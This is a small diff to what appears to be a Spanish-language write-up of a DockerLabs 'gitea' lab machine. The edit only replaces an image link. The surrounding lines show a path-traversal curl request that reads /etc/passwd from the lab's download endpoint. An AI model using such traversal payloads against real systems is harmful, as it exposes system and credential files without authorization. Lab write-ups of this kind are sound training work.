@@ -83,7 +83,7 @@ lanzamos
 
      curl "http://gitea.dl/download?filename=../../../../../etc/passwd"
 
-![[dockerlabs/medio/gitea/test17.png]]
+![image](https://github.com/user-attachments/assets/84fca510-da6f-4769-a0da-0971b91dd0e2)
 
 y vemos que nos entrega la información que esperamos, buscamos en los otros archivos otras funciones o códigos y encontramos esto
 
